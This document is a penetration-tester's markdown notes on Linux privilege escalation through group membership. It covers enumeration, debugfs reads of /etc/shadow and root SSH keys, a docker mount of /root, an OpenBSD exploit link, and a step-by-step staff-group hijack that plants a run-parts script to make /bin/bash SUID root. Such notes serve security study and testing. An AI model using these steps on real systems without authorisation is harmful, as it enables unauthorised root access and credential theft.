---
id: Group Enumeration
aliases: []
tags:
  - Linux/Privesc/Group-Enumeration
links: "[[Privesc]]"
---

# Group Enumeration

Enumerate groups on the target system

___

<!-- Enumerate {{{-->
## Enumerate

<!-- Current {{{-->
### Current

List current user's groups

```sh
id
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> id
> ```
>
> ```sh
> uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),107(bluetooth),120(lpadmin),129(wireshark),130(kaboxer),131(vboxsf)
> ```sh
>
<!-- }}} -->

<!-- }}} -->

<!-- Discover {{{-->
### Discover

List all groups and their assigned users

```sh
cat /etc/group
```

List all groups

```sh
cut -d: -f1 /etc/group
```

<!-- }}} -->

<!-- Members {{{-->
### Members

[getent](https://linux.die.net/man/1/getent) —
List members of all groups

```sh
getent group
```

[getent](https://linux.die.net/man/1/getent) —
List members of a specific group

```sh
getent group <group>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> getent group sudo
> ```
>
> ```sh
> getent group wheel
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Files {{{-->
### Files

[[Find]] files belonging to a group

```sh
find / -group <group_name> 2>/dev/null
```

<!-- Tip {{{-->
> [!tip]
>
> [[Directory & File|Enumerate]] found files
>
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- Privileged Groups {{{-->
## Privileged Groups

<!-- ADM {{{-->
### ADM

Members of the `adm` group are able to read all logs
stored in `/var/log`

```sh
ls -al /var/log
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> secaudit@NIX02:~$ id
> ```
>
> ```sh
> uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
> ```
<!-- }}} -->

<!-- Tip {{{-->
> [!tip]-
>
> - [[Cron Jobs]]
> - Enumerate log files
> - Enumerate user actions
<!-- }}} -->

<!-- }}} -->

<!-- Auth {{{-->
### Auth

In OpenBSD, members of the `auth` group allowed
to write `/etc/skey` and `/var/db/yubikey`

<!-- Exploit {{{-->
> [!tip]- Exploit
>
> [openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
> OpenBSD local root exploit for
> - [CVE-2019-19522](https://nvd.nist.gov/vuln/detail/cve-2019-19522)
> - [CVE-2019-19520](https://nvd.nist.gov/vuln/detail/cve-2019-19520)
>
<!-- }}} -->

<!-- }}} -->

<!-- Disk {{{-->
### Disk

Members of the `disk` group have full access
to any devices contained within `/dev`
(*e.g., `/dev/sda1`*)

<!-- Tip {{{-->
> [!tip]-
>
> - Files
>
> ```sh
> /dev/sd[a-z][1-9]
> ```
>
> - [[Users & Groups#Add User|Add User]]
> - [[Credential Hunting]]
> - [[SSH Keys]]
<!-- }}} -->

Find where `/` is mounted

```sh
df -h
```

[debugfs](https://linux.die.net/man/8/debugfs) —
ext2/ext3/ext4 file system debugger

<!-- Example {{{-->
> [!example]- Read Files
>
> ```sh
> debugfs /dev/sda1
> ```
>
> ```sh
> debugfs: cd /root
> ```
>
> ```sh
> debugfs: ls
> ```
>
> ```sh
> debugfs: cat /root/.ssh/id_rsa
> ```
>
> ```sh
> debugfs: cat /etc/shadow
> ```
<!-- }}} -->

<!-- Example {{{-->
> [!example]- Write Files
>
> Copy `/tmp/asd1.txt` to `/tmp/asd2.txt`
>
> ```sh
> debugfs -w /dev/sda1
> ```
>
> ```sh
> debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
> ```
>
> > [!warning]
> >
> > Files owned by root
> > will throw `Permission denied`
> > (*e.g., `/etc/shadow` or `/etc/passwd`*)
<!-- }}} -->

<!-- }}} -->

<!-- Docker {{{-->
### Docker

Members of the `docker` group can spawn new Docker containers

```sh
docker run -v /root:/mnt -it ubuntu
```

<!-- }}} -->

<!-- LXC {{{-->
### LXC

Members of the
[[Containers/General#LXC|LXC]]
group may access the host file system
from a privileged container

1. Create an LXD container
2. Make it privileged
3. Access the host file system at `/mnt/root`

<!-- Example {{{-->
> [!example]-
>
> ```sh
> devops@NIX02:~$ id
> ```
> ```sh
> uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
> ```
<!-- }}} -->

<!-- }}} -->

<!-- LXD {{{-->
### LXD

Members of the
[[Containers/General#LXD|LXD]]
group may access the host file system
from a privileged container

1. Create an LXD container
2. Make it privileged
3. Access the host file system at `/mnt/root`

<!-- Example {{{-->
> [!example]-
>
> ```sh
> devops@NIX02:~$ id
> ```
> ```sh
> uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Root {{{-->
### Root

Members of the `root` group can access or modify
some service configuration files or libraries

Discover files `root` members can modify

```sh
find / -group root -perm -g=w 2>/dev/null
```

<!-- }}} -->

<!-- Shadow {{{-->
### Shadow

Members of the `shadow` group can read `/etc/shadow`

```sh
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

```sh
cat /etc/shadow
```

<!-- }}} -->

<!-- Staff {{{-->
### Staff

Members of the `staff` group can add local modifications
to the system (`/usr/local`) without `root` privileges

<!-- Tip {{{-->
> [!tip]
>
> Executables in `/usr/local/bin` are in the [[Environment#PATH|PATH]]
> variable of any user, and they may take precedence over
> the executables in `/bin` and `/usr/bin` with the same name
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> `/usr/local/` will be run as the highest priority,
> whether the user is privileged user or not
>
> ```sh
> $ echo $PATH
> ```
> ```sh
> /usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
> ```
>
> ```sh
> # echo $PATH
> ```
> ```sh
> /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
> ```
<!-- }}} -->

Hijack a program

<!-- Example {{{-->
> [!example]- Cron Tab
>
> Cron tab executes `run-parts`
>
> ```sh
> $ cat /etc/crontab | grep run-parts
> ```
> ```sh
> 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
> 25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
> 47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
> 52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.m
> ```
<!-- }}} -->

<!-- Example {{{-->
> [!example]- SSH Session Login
>
> New [[SSH/General|SSH]] session login executes `run-parts`
>
> ```sh
> pspy64
> ```
> ```sh
> 2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
> 2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
> 2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
> 2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
> 2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
> 2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
> 2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
> 2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
> 2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
> ```
<!-- }}} -->

1. Add a `run-parts` script in `/usr/local/bin/`

```sh
vi /usr/local/bin/run-parts
```

```sh
#! /bin/bash
chmod 4777 /bin/bash
```

2. Add a execute permission

```sh
chmod +x /usr/local/bin/run-parts
```

3. Start a new [[SSH/General|SSH]] session to trigger `run-parts`

4. Check premission for `u+s`

```sh
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash
```

5. Root it

```sh
/bin/bash -p
```

<!-- }}} -->

<!-- Video {{{-->
### Video

Members of the `video` group can access the screen output

Grab the current image on the screen in raw data
and get the resolution that the screen is using
(*saved to `/dev/fb0`*)

1. [[User#Login|w]] - Get user login

```sh
w
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> w
> ```
> ```sh
> USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
> yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
> moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
> ```
>
> `tty1` means user `yossi` is logged physically to a terminal
<!-- }}} -->

2. Grab the current image of the screen

```sh
cat /dev/fb0 > /tmp/screen.raw
```

3. Find the resolution of the screen

```sh
cat /sys/class/graphics/fb0/virtual_size
```

<!-- }}} -->

<!-- Wheel {{{-->
### Wheel

Members of the `wheel` group can execute anything as `sudo`
if enabled in `/etc/sudoers`

```sh
cat /etc/sudoers
```

```sh
%wheel  ALL=(ALL:ALL) ALL
```

Execute anything as `sudo`

```sh
sudo su
```

<!-- }}} -->

___
<!-- }}} -->
